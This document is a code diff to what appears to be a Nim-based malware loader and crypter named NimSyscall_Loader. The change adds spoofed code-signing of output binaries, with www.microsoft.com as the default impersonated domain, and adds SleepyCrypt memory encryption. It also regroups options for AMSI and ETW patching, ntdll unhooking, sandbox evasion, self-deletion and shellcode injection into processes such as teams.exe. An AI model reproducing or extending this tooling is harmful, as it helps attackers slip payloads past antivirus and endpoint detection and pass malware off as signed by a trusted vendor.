@@ -14,12 +14,16 @@ import os
 import osproc
 import docopt
 import random
+import winim
+import streams
+import winim/clr except `[]`
 
 import HellsgateStubs
 import CustomEvasionStubs
 import GetSyscallStubs
 import SandboxStubs
 import Whispers
+import SleepyCryptSleep
 
 
 from system import io
@@ -58,6 +62,9 @@ Usage:
   NimSyscall_Loader --version
 
 Options:
+
+[general]
+
   -h --help     Show this screen.
   --version     Show version.
   --file filename  File to encrypt.
@@ -65,10 +72,8 @@ Options:
   --output filename    Filename for encrypted exe/dll
   --dll     Generate DLL instead of an exe
   --dllexportfunc exportfuncname    Comma separated names of DLL custom export functions
-  --COMVARETW    Block ETW by setting COMPlus_ETWEnabled to 0
   --noETW    Don't use ETW Patch
   --noAMSI    Don't patch AMSI
-  --csharp    Encrypt a C# Assembly to load it on runtime
   --noArgs    Don't provide any arguments to the assembly (some can only run without args)
   --hide    Compile with --app:gui flag, so that the console won't pop up
   --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
@@ -79,36 +84,51 @@ Options:
 [evasion]
 
   --sleep 10    Sleep 10 seconds before decryption to evade in memory scanners
-  --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
-  --remoteprocess procname    Injects into the specified remote process name, e.g. teams.exe. The loader searches for the first process with that name
-                     Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
-  --remotepatchAMSI    Patch AMSI in the remote process before shellcode execution
-  --remotepatchETW    Patch ETW in the remote process before shellcode execution
+  --COMVARETW    Block ETW by setting COMPlus_ETWEnabled to 0
   --unhook    Unhook ntdll.dll before doing anything else for the current process
-  --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
   --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation (not possible in combination with --reflective)
-  --hide    Compile with --app:gui flag, so that the console won't pop up
-  --peinject    Encrypt a PE to decrypt and run it on runtime as shellcode via donut
-  --peload    Encrypt a PE to decrypt it on runtime and execute it via a syscall variant of Run-PE
-  --hellsgate    Retrieve Syscalls via Hellsgate technique (for patching AMSI/ETW or shellcode execution/PE injection)
-  --syswhispers    Embed Syscalls via Syswhispers3 (NimLineWhispers3) technique
-  --jump    When using Syswhispers3, use the jumper_randomized technique
-  --sgn    Encode shellcode via SGN before encrypting it
+  --sgn    Encode shellcode via SGN before encrypting it´
   --replace    Replace common nim IoC's in the loader like the string 'nim'
   --sandbox value    Include Sandbox Checks of your choice into the loader:
                      Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
                      DomainJoined -> Only execute if the target is connected to ANY domain - you don't need to know the target's domain for this one
                      DiskSpace -> Only execute if c:\ disk space >= 200GB
                      MemorySpace -> Only execute if more than 4GB RAM available
+        --domain targetdomain    Specify a domain for SandBox Evasion
   --pump value    Pump the file with:
                   words -> english dictionary words to increase the reputation for "mashine learning" evasion (https://twitter.com/hardwaterhacker/status/1502425183331799043)
                   reputation -> Pump reputation with strings from well known binaries e.g. Chrome,Cortana,Discord and some others
-  --domain targetdomain    Specify a domain for SandBox Evasion
   --self-delete    The loader deletes it's own executable on runtime (Credit to @byt3bl33d3r and @jonasLyk)
   --obfuscatefunctions    Obfuscate some Nim specific Windows API's from the IAT via CallObfuscator (https://github.com/d35ha/CallObfuscator - only possible from a Windows OS)
-  --debug    Compiles the binary in debug mode (More DInvoke output)
-  --x86    (Compiles an x86 binary - have to cast some more function values before this works smoothly)
+  --sign    Sign the binary with a spoofed certificate
+      --signdomain www.example.com    The domain to use for the certificate (default is www.microsoft.com)
   --llvm    Add compiler flags for LLVM obfuscation, you have to set it up by yourself
+  --sleepycrypt    Encrypt the memory of the loader with SleepyCrypt # experimental (Pre-Alpha, not working yet for C2-Stager)
+
+[Syscall retrival technique to use, default is GetSyscallStub to retrievethe stubs from disk]
+
+  --hellsgate    Retrieve Syscalls via Hellsgate technique (for patching AMSI/ETW or shellcode execution/PE injection)
+  --syswhispers    Embed Syscalls via Syswhispers3 (NimLineWhispers3) technique
+        --jump    When using Syswhispers3, use the jumper_randomized technique
+
+[shellcode specific]
+
+  --shellcode    Encrypt shellcode to load it on runtime
+  --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
+  --remoteprocess procname    Injects into the specified remote process name, e.g. teams.exe. The loader searches for the first process with that name
+                     Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
+  --remotepatchAMSI    Patch AMSI in the remote process before shellcode execution
+  --remotepatchETW    Patch ETW in the remote process before shellcode execution
+  
+[PE Packing]
+
+  --peinject    Encrypt a PE to decrypt and run it on runtime as shellcode via donut
+  --peload    Encrypt a PE to decrypt it on runtime and execute it via a syscall variant of Run-PE
+
+[C# assembly Packing]
+
+    --csharp    Encrypt a C# assembly to load it on runtime
+
 """
 
 if (paramCount() == 0):
@@ -162,6 +182,8 @@ var
     pumpfmt: string = ""
     pumpargs: seq[string]
     debugMode: bool = false
+    sign: bool = false
+    signdomain: string = "www.microsoft.com"
     compileX86: bool = false
     noassembly: bool = false
     sleepycrypt: bool = false
@@ -257,8 +279,18 @@ if args["--reflective"]:
 if args["--obfuscate"]:
   denim = true
 
+if args["--sign"]:
+    sign = true
+
+if args["--signdomain"]:
+    let signarg = args["--signdomain"]
+    signdomain = fmt"{signarg}"
+
 if args["--llvm"]:
   llvm = true
+
+if args["--sleepycrypt"]:
+    sleepycrypt = true
 
 if args["--hide"]:
   hide = true
@@ -319,6 +351,54 @@ if args["--noDInvoke"]:
   noDInvoke = true
 
 var blob: string
+
+if (peinject and peload):
+    echo "Error: Cannot use both --peinject and --peload"
+    quit(1)
+
+if (syswhispers and hellsgate):
+    echo "Error: Cannot use both --syswhispers and --hellsgate"
+    quit(1)
+
+if (hellsgate and jump):
+    echo "Error: Cannot use both --hellsgate and --jump! --jump can only be used with --syswhispers"
+    quit(1)
+
+if ((csharp and shellcode) or (csharp and peload) or (csharp and peinject) or (peload and shellcode)):
+    echo "Error: You can only use one of --csharp, --shellcode, --peload, or --peinject!"
+    quit(1)
+if (peload or peinject):
+    let stream = newFileStream(filename, mode = fmRead)
+    defer: stream.close()
+    # Check magic string
+    var magic_string: array[2, char]
+    discard stream.readData(magic_string.addr, 2)
+    if magic_string != "MZ":
+        echo "[-] No Magic bytes found, file is not a PE"
+        quit(1)
+
+if (csharp):
+    blob = readFile(filename)
+    var blobbytes = toByteSeq(blob)
+    var code = fmt"""
+    using System;
+    public class Check {{
+      public void ifAssembly() {{
+        object asd = System.Reflection.AssemblyName.GetAssemblyName(@"{filename}");
+      }}
+    }}
+    """
+    try:
+        var res = compile(code)
+        var o = res.CompiledAssembly.new("Check")
+        o.ifAssembly()
+    except:
+        echo "[-] Error - you didn't specify a C# assembly!"
+        noassembly = true
+
+if (noassembly):
+    quit(1)
+
 #Read file and if PE convert to shellcode before
 if (peinject):
     when system.hostOS == "windows":
@@ -749,6 +829,10 @@ proc FUNC_EXPORT(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BO
     return true
 """
 
+let SleepyCryptLoopExecute = """
+SleepyCryptLoop(10000)
+"""
+
 var stub = Cryptstub1
 if (not noDInvoke):
     stub.add(DInvokeBaseStub)
@@ -1003,6 +1087,10 @@ if (pump):
         if(m == "words"):
             stub.add(genEnglishwords(rand(4750..7800)))
 
+if (sleepycrypt):
+    stub.add(SleepyCryptTestStub)
+    stub.add(SleepyCryptLoopExecute)
+
 if (debugMode):
     stub = stub.replace("import strenc", "")
 
@@ -1059,9 +1147,9 @@ if (llvm):
             echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
             quit()
 elif system.hostOS == "windows":
-    basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size "
+    basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
 elif system.hostOS == "linux":
-    basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size "
+    basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
 
 
 if (compileX86):
@@ -1145,3 +1233,13 @@ if (callobfs):
         echo fmt"Obfuscated binary saved to: cobf\{outfileonlyname}"
     else:
         echo "Only usable from a Windows OS, sorry!"
+
+if (sign):
+    echo "[*] Using Limelighter to generate a fake code signing certificate for the binary"
+    echo fmt"[*] The domain to spoof the certificate from will be {signdomain}"
+    if system.hostOS == "linux":
+        discard os.execShellCmd(fmt"{packerPath}/LimeLighter/Limelighter -Domain {signdomain} -I {outfile} -O {outfile}.Signed.exe")
+    when system.hostOS == "windows":
+        #var command = fmt"{packerPath}\LimeLighter\Limelighter.exe -Domain {signdomain} -I {packerPath}\{outfile} -O {packerPath}\{outfile}.Signed.exe"
+        #echo command
+        discard os.execShellCmd(fmt"{packerPath}\LimeLighter\Limelighter.exe -Domain {signdomain} -I {outfile} -O {outfile}.Signed.exe")
